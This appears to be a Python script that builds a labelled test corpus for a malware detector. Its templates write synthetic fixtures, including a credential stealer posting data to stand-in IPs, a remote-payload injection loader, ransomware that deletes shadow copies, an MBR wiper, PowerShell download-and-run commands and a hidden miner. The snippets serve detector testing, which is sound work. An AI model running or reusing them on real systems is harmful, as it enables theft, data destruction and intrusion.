"""Assemble the 1,000-case pilot from existing material only.

Sources, all already in this repository or generated here from seeded
templates whose labels are true by construction:
  - the 37-case verification corpus (fixtures/verification/),
  - 4 repo fixtures (fake_malware, fixtures/evil.py, fixtures/eicar.com,
    fixtures/hello_elf),
  - 959 seeded synthetic variants of the corpus fixture patterns
    (malicious patterns, their false-positive twins, benign utilities,
    EICAR variants, malformed files).

No live malware, no downloads, no network. Generated variants of one
template share a cluster_id: the pilot has 1,000 cases but far fewer
independent clusters, and the pilot report says so.

Outputs in validation/pilot/: cases/, manifest.jsonl (full),
manifest.runner.jsonl (labels stripped), sealed_expectations.jsonl,
build_summary.json with both roots.

Usage: python3 -m validation.harness.build_pilot
"""
import base64, hashlib, io, json, os, sys, zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
PILOT = os.path.join(ROOT, "validation", "pilot")
CASES_DIR = os.path.join(PILOT, "cases")
ACQUIRED = "2026-11-23"
WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def sha256(b):
    return hashlib.sha256(b).hexdigest()


def tree_hash(path):
    if os.path.isfile(path):
        return sha256(open(path, "rb").read())
    digests = []
    for dp, _dn, fn in os.walk(path):
        for f in sorted(fn):
            digests.append(sha256(open(os.path.join(dp, f), "rb").read()))
    return sha256("".join(sorted(digests)).encode())


def provenance(source, ref):
    return {"source": source, "source_ref": ref,
            "terms_basis": "project-owned material; no external terms apply",
            "acquired": ACQUIRED, "first_seen": ACQUIRED}


def label(token, rendering, atoms, family, status, labellers, adj):
    return {"expected_token": token, "expected_rendering": rendering,
            "required_atoms": atoms, "family": family, "label_status": status,
            "labellers": labellers, "adjudication_ref": adj}


# ---------------------------------------------------------------- templates
# Each returns (filename, bytes, required_atoms). Labels are true by
# construction: the generator writes the bytes, so it knows the atoms.

def t_stealer_chain(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""# generated variant {i}
import os, zipfile
from ctypes import windll
blob = CryptUnprotectData(open(r"C:\\Users\\lab\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data","rb").read())
db = sqlite3.connect(r"C:\\Users\\lab\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data")
w = open(r"C:\\Users\\lab\\AppData\\Roaming\\Exodus\\exodus.wallet","rb").read()
with zipfile.ZipFile("loot{i}.zip","w") as z: z.write("loot.txt")
import urllib.request; urllib.request.urlopen("http://{ip}/loot", data=b"x")
"""
    return f"stealer_chain_{i}.py", body.encode(), ["Login Data", ip]


def t_stealer_config(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""; generated variant {i}
[collect]
Software\\Google\\Chrome\\User Data\\Default\\Login Data
Software\\Google\\Chrome\\User Data\\Default\\Cookies
%APPDATA%\\Exodus\\exodus.wallet
%APPDATA%\\Electrum\\wallets
keyMaterial = takeMasterSecret()
archive = ZipFile("loot.zip")
ScanningArgs = new StealerConfig(new HostPort("{ip}", 9001), new ClientInfo(42), new BuildInfo("lab"))
"""
    return f"stealer_config_{i}.py", body.encode(), ["Login Data", "ScanningArgs"]


def t_rat(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""# generated variant {i}
import socket, subprocess
HOST, PORT = "{ip}", 4443
commands = ["shell", "download", "upload", "persist", "screenshot", "keylog"]
def dispatch(cmd, arg):
    if cmd == "shell": return subprocess.run(arg, shell=True)
    if cmd == "download": return open(arg, "rb").read()
    if cmd == "upload": return open(arg, "wb").write(b"")
    if cmd == "persist": return True
    if cmd == "screenshot": return True
    if cmd == "keylog": return True
"""
    return f"rat_{i}.py", body.encode(), ["dispatch", ip]


def t_loader_inject(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""# generated variant {i}
import ctypes, urllib.request
data = urllib.request.urlopen("http://{ip}/payload.bin").read()
h = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, 4242)
addr = ctypes.windll.kernel32.VirtualAllocEx(h, None, len(data), 0x3000, 0x40)
ctypes.windll.kernel32.WriteProcessMemory(h, addr, data, len(data), None)
ctypes.windll.kernel32.CreateRemoteThread(h, None, 0, addr, None, 0, None)
"""
    return f"loader_inject_{i}.py", body.encode(), ["VirtualAllocEx", ip]


def t_loader_dead_drop(i):
    body = f"""# generated variant {i}
import base64, ctypes, urllib.request
page = urllib.request.urlopen("https://pastebin.com/raw/labdead{i}").read()
payload = base64.b64decode(page)
buf = ctypes.create_string_buffer(payload, len(payload))
ctypes.windll.kernel32.VirtualAlloc(None, len(payload), 0x3000, 0x40)
ctypes.windll.ntdll.RtlMoveMemory(buf, payload, len(payload))
"""
    return f"loader_dead_drop_{i}.py", body.encode(), ["pastebin.com/raw", "VirtualAlloc"]


def t_server_keyed(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""# generated variant {i}
import ctypes, urllib.request
key = urllib.request.urlopen("http://{ip}/getkey?id=lab").read()
data = urllib.request.urlopen("http://{ip}/payload_url").read()
buf = ctypes.create_string_buffer(data, len(data))
ctypes.windll.kernel32.VirtualAlloc(None, len(data), 0x3000, 0x40)
"""
    return f"server_keyed_{i}.py", body.encode(), ["getkey", "payload_url"]


def t_botnet(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""# generated variant {i}
import socket, struct
def udp_flood(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True: s.sendto(b"X" * 1024, (target, 80))
def syn_flood(target):
    while True: struct.pack("!HH", 1, 2)
C2 = "{ip}"
commands = ["flood", "stop", "update", "shell"]
def dispatch(cmd):
    if cmd == "flood": udp_flood(C2)
"""
    return f"botnet_{i}.py", body.encode(), ["udp_flood", ip]


def t_keylogger(i):
    body = f"""# generated variant {i}
import ctypes
state = ctypes.windll.user32.GetAsyncKeyState(65)
title = ctypes.windll.user32.GetForegroundWindowText()
log = open(r"C:\\ProgramData\\.hidden\\keys{i}.log", "a")
log.write(title + chr(65))
"""
    return f"keylogger_{i}.py", body.encode(), ["GetAsyncKeyState"]


def t_script_bad(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""@echo off
rem generated variant {i}
cscript C:\\Windows\\System32\\slmgr.vbs /skms kms.lab.invalid
cscript C:\\Windows\\System32\\slmgr.vbs /ato
powershell -c "Invoke-WebRequest http://{ip}/evil.exe -OutFile %TEMP%\\evil.exe"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v bad /d %TEMP%\\evil.exe
"""
    return f"script_bad_{i}.bat", body.encode(), [ip]


def t_miner_hidden(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""; generated variant {i}
pool = stratum+tcp://{ip}:3333
wallet = {WALLET}
xmrig --config pool.json --hidden
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d miner.exe
windowStyle = Hidden
"""
    return f"miner_hidden_{i}.py", body.encode(), [f"stratum+tcp://{ip}", "Hidden"]


def t_ransomware(i):
    body = f"""# generated variant {i}
import os
from Crypto.Cipher import AES
KEY = b"labkeymaterial0123456789abcdef"
for root, dirs, files in os.walk("C:\\\\Users\\\\lab\\\\Documents"):
    for name in files:
        if name.endswith((".docx", ".xlsx", ".pdf", ".jpg")):
            p = os.path.join(root, name)
            data = open(p, "rb").read()
            open(p + ".locked", "wb").write(AES.new(KEY, AES.MODE_CBC).encrypt(data))
            os.remove(p)
open("README_RESTORE.txt", "w").write("Your files are encrypted. Pay 0.5 BTC to recover them. Contact restore{i}@evil.invalid")
os.system("vssadmin Delete Shadows /all /quiet")
"""
    return f"ransomware_{i}.py", body.encode(), ["README_RESTORE.txt", "vssadmin Delete Shadows"]


def t_banking(i):
    body = f"""; generated variant {i}
targets:
https://www.bankofamerica.com/login
https://www.chase.com/auth
https://online.wellsfargo.com/login
https://www.citi.com/login
hook = WebInject
formgrab = true
"""
    return f"banking_{i}.py", body.encode(), ["WebInject"]


def t_ppi(i):
    aff = f"AFF-{8800 + i}-LAB"
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""; generated variant {i}
affiliate_id = {aff}
on install complete: GET http://{ip}/callback?aff={aff}&done=1
bundle: browser toolbar, system optimizer, crypto miner trial
"""
    return f"ppi_{i}.py", body.encode(), [aff]


def t_hijacker(i):
    body = f"""; generated variant {i}
set homepage = http://search{i}.evil.invalid/
set default search provider = evilsearch
watchdog: if homepage changed, restore evil.invalid
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v guard /d hijack.exe
"""
    return f"hijacker_{i}.py", body.encode(), ["evil.invalid"]


def t_fileless(i):
    ip = f"198.51.100.{20 + i % 60}"
    inner = f"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://{ip}/stage{i}') ; lab fileless payload text, long enough to be a real blob token for the parser"
    blob = base64.b64encode(inner.encode()).decode()
    body = f"""# generated variant {i}
WMI = "__EventFilter binding to a CommandLineEventConsumer"
RUN = "powershell -EncodedCommand {blob}"
"""
    return f"fileless_{i}.py", body.encode(), ["EncodedCommand"]


def t_wiper(i):
    body = f"""# generated variant {i}
import ctypes
h = ctypes.windll.kernel32.CreateFileW("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0, None, 3, 0, None)
ctypes.windll.kernel32.WriteFile(h, b"\\x00" * 512, 512, None, None)
# overwrite MBR sector 0
"""
    return f"wiper_{i}.py", body.encode(), ["PhysicalDrive0"]


def t_bootkit(i):
    body = f"""; generated variant {i}
target = EFI\\Microsoft\\Boot\\bootmgfw.efi
write(target, patched_loader)
disable SecureBoot verification
patch AME / integrity checks in boot chain
load unsigned driver at boot
"""
    return f"bootkit_{i}.py", body.encode(), ["bootmgfw.efi"]


def t_proxy_operator(i):
    ip = f"198.51.100.{20 + i % 60}"
    body = f"""; generated variant {i}
enrol = http://{ip}/enrol?aff=LAB
peer2profit-sdk embedded
service runs as SYSTEM
netsh advfirewall firewall add rule name=px dir=in allow
pawns.app resident proxy, beneficiary = operator wallet
"""
    return f"proxy_operator_{i}.py", body.encode(), ["peer2profit"]


def t_twin_keygen(i):
    body = f"""import hashlib
# keygen variant {i}
print('serial:', hashlib.md5(b'x{i}').hexdigest()[:8])
"""
    return f"twin_keygen_{i}.py", body.encode(), []


def t_twin_password_manager(i):
    body = f"""# friendly password manager, variant {i}
from cryptography.fernet import Fernet
class Vault:
    def unlock(self, master):
        return Fernet(master).decrypt(open("C:\\\\Users\\\\lab\\\\Documents\\\\MyPasswords{i}.kdbx","rb").read())
    def save(self, path="C:\\\\Users\\\\lab\\\\Documents\\\\MyPasswords{i}.kdbx"):
        pass
"""
    return f"twin_password_manager_{i}.py", body.encode(), []


def t_twin_miner_disclosed(i):
    body = f"""# My Miner Setup, variant {i}
# This is my own XMRig build. It mines to my own wallet on my own pool server at home.
wallet = {WALLET}
pool = stratum+tcp://192.0.2.55:3333
xmrig --config my-rig.json
# run it in a visible console window so I can watch the hashrate
"""
    return f"twin_miner_disclosed_{i}.py", body.encode(), []


def t_twin_backup(i):
    body = f"""import os
from Crypto.Cipher import AES
# Nightly backup, variant {i}: encrypt new documents to the backup drive, then remove the local temp copies.
for name in os.listdir("C:\\\\Users\\\\lab\\\\Documents"):
    if name.endswith((".docx", ".pdf")):
        data = open(name, "rb").read()
        open("E:\\\\Backups\\\\" + name + ".bak", "wb").write(AES.new(b"mybackupkey0123456789abcdef01", AES.MODE_CBC).encrypt(data))
        os.remove("C:\\\\Users\\\\lab\\\\Temp\\\\" + name)
print("backup complete")
"""
    return f"twin_backup_{i}.py", body.encode(), []


def t_twin_kms(i):
    body = f"""@echo off
rem clean KMS variant {i}
cscript C:\\Windows\\System32\\slmgr.vbs /skms kms.lab.invalid
cscript C:\\Windows\\System32\\slmgr.vbs /ato
schtasks /create /tn "Activation Renewal" /tr "cscript C:\\Windows\\System32\\slmgr.vbs /ato" /sc daily
"""
    return f"twin_kms_{i}.bat", body.encode(), []


def t_twin_proxy_disclosed(i):
    body = f"""# Honeygain-style earnings app (my account), variant {i}
# I run this on my home PC to sell my unused bandwidth. It shows a tray icon and a dashboard.
# Earnings go to my own account. Support: help@honeygain.invalid
app name = BandwidthShare
runs in a visible window with a dashboard and a quit button
"""
    return f"twin_proxy_disclosed_{i}.py", body.encode(), []


def t_twin_capture(i):
    body = f"""# accessibility screen reader helper, variant {i}
import ctypes
state = ctypes.windll.user32.GetAsyncKeyState(9)
img = ImageGrab.grab()
notes = open("C:\\\\Users\\\\lab\\\\Documents\\\\accessibility-notes{i}.txt", "a")
"""
    return f"twin_capture_{i}.py", body.encode(), []


def t_twin_xmrig(i):
    body = f"""; someone packed the stock miner binary alone, variant {i}
xmrig 6.21.0
stratum+tcp://192.0.2.99:4444
"""
    return f"twin_xmrig_{i}.py", body.encode(), []


def t_banking_article(i):
    body = f"""Banking trojans in the news, explained for readers. Article {i}.
Security reporters this week described stealers that watch for banking sites.
The article mentions several banks by name for context:
Bank of America (bankofamerica.com), JPMorgan Chase (chase.com),
Wells Fargo (wellsfargo.com), and Citibank (citi.com) were all named in vendor blogs.
No code is included in this article; it is reporting, not software.
"""
    return f"banking_article_{i}.txt", body.encode(), []


def t_benign_utility(i):
    shapes = [
        "import csv, sys\nrows = list(csv.reader(open(sys.argv[1])))\nprint('rows:', len(rows))\n",
        "import os\nfor name in sorted(os.listdir('.')):\n    print(name)\n",
        "def add(a, b):\n    return a + b\nprint(add(2, 3))\n",
        "import json\nprint(json.dumps({'variant': %d, 'ok': True}, indent=2))\n",
        "words = open('notes.txt').read().split()\nprint('words:', len(words))\n",
    ]
    body = f"# benign utility variant {i}\n" + shapes[i % len(shapes)]
    if i % len(shapes) == 3:
        body = body % i
    return f"benign_utility_{i}.py", body.encode(), []


def t_eicar(i):
    pad = b" " * (i % 40) + (b"\n" if i % 3 == 0 else b"")
    return f"eicar_variant_{i}.com", EICAR + pad, []


def t_malformed(i):
    elf = open(os.path.join(ROOT, "fixtures", "hello_elf"), "rb").read()
    kind = i % 4
    if kind == 0:
        data = elf[: 40 + i]
    elif kind == 1:
        data = b"MZ" + b"\x00" * (10 + i)
    elif kind == 2:
        data = bytes((j * 37 + i * 11) % 256 for j in range(200 + i))
    else:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("inner.py", "print('hi')\n")
        data = buf.getvalue()[: len(buf.getvalue()) // 2]
    return f"malformed_{i}.bin", data, []


PROVEN_TEMPLATES = [
    ("stealer_chain", t_stealer_chain, 50, "stealer"),
    ("stealer_config", t_stealer_config, 50, "stealer"),
    ("rat", t_rat, 50, "rat"),
    ("loader_inject", t_loader_inject, 50, "loader"),
    ("loader_dead_drop", t_loader_dead_drop, 40, "loader"),
    ("server_keyed", t_server_keyed, 40, "server-keyed"),
    ("botnet", t_botnet, 30, "botnet"),
    ("keylogger", t_keylogger, 40, "keylogger"),
    ("script_bad", t_script_bad, 40, "malicious-script"),
    ("miner_hidden", t_miner_hidden, 54, "miner"),
    ("ransomware", t_ransomware, 50, "ransomware"),
    ("banking", t_banking, 30, "banking"),
    ("ppi", t_ppi, 30, "ppi"),
    ("hijacker", t_hijacker, 30, "adware-hijacker"),
    ("fileless", t_fileless, 30, "fileless"),
    ("wiper", t_wiper, 20, "wiper"),
    ("bootkit", t_bootkit, 20, "bootkit"),
    ("proxy_operator", t_proxy_operator, 30, "proxy"),
]
NO_TEMPLATES = [
    ("twin_keygen", t_twin_keygen, 25, "keygen-control"),
    ("twin_password_manager", t_twin_password_manager, 30, "stealer-fp-twin"),
    ("twin_miner_disclosed", t_twin_miner_disclosed, 25, "miner-fp-twin"),
    ("twin_backup", t_twin_backup, 25, "ransomware-fp-twin"),
    ("twin_kms", t_twin_kms, 20, "script-fp-twin"),
    ("twin_proxy_disclosed", t_twin_proxy_disclosed, 20, "proxy-fp-twin"),
    ("twin_capture", t_twin_capture, 20, "keylogger-fp-twin"),
    ("twin_xmrig", t_twin_xmrig, 15, "miner-presence-control"),
    ("banking_article", t_banking_article, 15, "surprise-banking-fp"),
    ("benign_utility", t_benign_utility, 30, "benign-utility"),
    ("eicar", t_eicar, 20, "test-file"),
]
TWIN_LINKS = {"miner_hidden": "twin_miner_disclosed", "ransomware": "twin_backup",
              "keylogger": "twin_capture", "proxy_operator": "twin_proxy_disclosed",
              "banking": "banking_article", "stealer_chain": "twin_password_manager"}


def gen_cases():
    """Yield (case_dict, write_fn) for the 959 generated cases."""
    out = []
    seq = [0]

    def split_for(idx):
        return "development" if idx % 10 < 7 else "tuning" if idx % 10 < 9 else "adversarial"

    def add(template, fn, i, token, rendering, family, stratum):
        seq[0] += 1
        name, data, atoms = fn(i)
        rel = os.path.join("cases", template, name)
        abspath = os.path.join(PILOT, rel)
        case = {
            "subject_path": os.path.join("validation", "pilot", rel).replace(os.sep, "/"),
            "sha256": sha256(data),
            "kind": "file",
            "stratum": stratum,
            "split": split_for(seq[0]),
            "tier": "T0",
            "provenance": provenance("synthetic-generator", f"validation/harness/build_pilot.py template {template} variant {i}"),
            "label": label(token, rendering, atoms, family, "constructed",
                           ["build_pilot.py generator"], f"template:{template}"),
            "structure": {"layer_tree_hash": sha256(data), "genuine_ref_sha256": None,
                          "twin_case_id": None, "cluster_id": f"cluster-{template}"},
        }
        out.append((case, abspath, data))

    for template, fn, count, family in PROVEN_TEMPLATES:
        for i in range(count):
            add(template, fn, i, "YES", "PROVEN", family, f"synthetic-proven-{template}")
    for template, fn, count, family in NO_TEMPLATES:
        for i in range(count):
            add(template, fn, i, "NO", "ACCOUNTED", family, f"synthetic-benign-{template}")
    for i in range(30):
        add("malformed", t_malformed, i, "OPEN_STATE", "OPEN", "malformed", "synthetic-open-malformed")
    # Zip-wrapped and folder variants: rewrap selected already-added
    # cases is not possible here; instead convert every 25th generated
    # file case into a zip archive holding the same bytes.
    converted = []
    for idx, (case, abspath, data) in enumerate(out):
        if idx % 25 == 24 and case["kind"] == "file":
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w") as z:
                z.writestr(os.path.basename(abspath), data)
            zdata = buf.getvalue()
            zpath = abspath + ".zip"
            case["subject_path"] = case["subject_path"] + ".zip"
            case["sha256"] = sha256(zdata)
            case["kind"] = "archive"
            case["structure"]["layer_tree_hash"] = sha256(zdata)
            converted.append((case, zpath, zdata))
            out[idx] = (case, None, None)
    out = [(c, p, d) for (c, p, d) in out if p is not None] + converted
    # Twin links between first variants of paired templates.
    first_by_template = {}
    for case, _p, _d in out:
        template = case["structure"]["cluster_id"].split("-", 1)[1]
        first_by_template.setdefault(template, case)
    for a, b in TWIN_LINKS.items():
        if a in first_by_template and b in first_by_template:
            first_by_template[a]["structure"]["twin_case_id"] = "PENDING"
            first_by_template[b]["structure"]["twin_case_id"] = "PENDING"
    return out, first_by_template


def corpus_cases():
    man = json.load(open(os.path.join(ROOT, "fixtures", "verification", "manifest.json")))
    out = []
    for e in man["entries"]:
        base = os.path.join(ROOT, "fixtures", "verification", "files", e["path"])
        exp = e["expected"]
        token = "OPEN_STATE" if exp.get("case_state") == "OPEN" else exp["verdict"]
        rendering = "OPEN" if exp.get("case_state") == "OPEN" else exp["reason_class"]
        kind = "folder" if os.path.isdir(base) else "archive" if e["path"].endswith(".zip") else "file"
        case = {
            "subject_path": f"fixtures/verification/files/{e['path']}",
            "sha256": tree_hash(base),
            "kind": kind,
            "stratum": ("designed-open" if exp.get("case_state") == "OPEN" else
                        "surprise" if e["family"].startswith("surprise") else
                        "fp-twin" if "twin" in e["family"] or "control" in e["family"] else "family-proven"),
            "split": "regression",
            "tier": "T2" if e["tier"] == 2 else "T1",
            "provenance": provenance("repo-fixture", "fixtures/verification/manifest.json"),
            "label": label(token, rendering, e.get("atoms", []), e.get("family"),
                           "adjudicated", ["verification corpus manifest"], "fixtures/verification/manifest.json"),
            "structure": {"layer_tree_hash": tree_hash(base), "genuine_ref_sha256": None,
                          "twin_case_id": None, "cluster_id": f"corpus-{e['family']}"},
        }
        if e.get("reference_path"):
            ref = os.path.join(ROOT, "fixtures", "verification", "files", e["reference_path"])
            case["reference_path"] = f"fixtures/verification/files/{e['reference_path']}"
            case["structure"]["genuine_ref_sha256"] = tree_hash(ref)
        out.append(case)
    return out


def repo_cases():
    specs = [
        ("fake_malware", "fake_malware", "YES", "PROVEN", [], "mixed", "flagship-sample"),
        ("fixtures/evil.py", "fixtures/evil.py", "YES", "PROVEN", [], "malicious-script", "repo-malicious-script"),
        ("fixtures/eicar.com", "fixtures/eicar.com", "NO", "ACCOUNTED", [], "test-file", "test-file"),
        ("fixtures/hello_elf", "fixtures/hello_elf", "OPEN_STATE", "OPEN", [], "lone-binary", "lone-binary-unaccounted"),
    ]
    out = []
    for _name, rel, token, rendering, atoms, family, stratum in specs:
        base = os.path.join(ROOT, rel)
        out.append({
            "subject_path": rel,
            "sha256": tree_hash(base),
            "kind": "file",
            "stratum": stratum,
            "split": "regression",
            "tier": "T1",
            "provenance": provenance("repo-fixture", rel),
            "label": label(token, rendering, atoms, family, "constructed",
                           ["pilot builder, verified by probe run 2026-11-23"], f"repo-fixture:{rel}"),
            "structure": {"layer_tree_hash": tree_hash(base), "genuine_ref_sha256": None,
                          "twin_case_id": None, "cluster_id": f"repo-{family}"},
        })
    return out


def main():
    sys.path.insert(0, ROOT)
    from validation.harness.manifest import write_jsonl, split_manifest, manifest_root, validate_case
    os.makedirs(CASES_DIR, exist_ok=True)
    generated, _first = gen_cases()
    for case, abspath, data in generated:
        if abspath:
            os.makedirs(os.path.dirname(abspath), exist_ok=True)
            with open(abspath, "wb") as f:
                f.write(data)
    cases = corpus_cases() + repo_cases()
    gen_dicts = [c for c, _p, _d in generated]
    cases.extend(gen_dicts)
    for n, case in enumerate(cases, 1):
        case["case_id"] = f"pilot-{n:04d}"
    # Resolve twin links now that ids exist.
    by_cluster_first = {}
    for case in cases:
        by_cluster_first.setdefault(case["structure"]["cluster_id"], case["case_id"])
    for case in cases:
        if case["structure"].get("twin_case_id") == "PENDING":
            template = case["structure"]["cluster_id"].split("-", 1)[1]
            partner = None
            for a, b in TWIN_LINKS.items():
                if template == a:
                    partner = b
                elif template == b:
                    partner = a
            case["structure"]["twin_case_id"] = by_cluster_first.get(f"cluster-{partner}")
    problems = []
    for case in cases:
        problems.extend(f"{case['case_id']}: {p}" for p in validate_case(case))
    if problems:
        print("SCHEMA PROBLEMS:")
        for p in problems[:20]:
            print(" -", p)
        return 1
    full_root = write_jsonl(os.path.join(PILOT, "manifest.jsonl"), cases)
    runner_cases, sealed = split_manifest(cases)
    for rc, src in zip(runner_cases, cases):
        rc["subject_path"] = src["subject_path"]
        if src.get("reference_path"):
            rc["reference_path"] = src["reference_path"]
    runner_root = write_jsonl(os.path.join(PILOT, "manifest.runner.jsonl"), runner_cases)
    sealed_root = write_jsonl(os.path.join(PILOT, "sealed_expectations.jsonl"), sealed)
    summary = {"cases": len(cases), "manifest_root": full_root, "runner_root": runner_root,
               "sealed_root": sealed_root, "manifest_root_check": manifest_root(cases),
               "generated": len(gen_dicts), "corpus": 37, "repo_fixtures": 4}
    with open(os.path.join(PILOT, "build_summary.json"), "w") as f:
        json.dump(summary, f, indent=2)
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
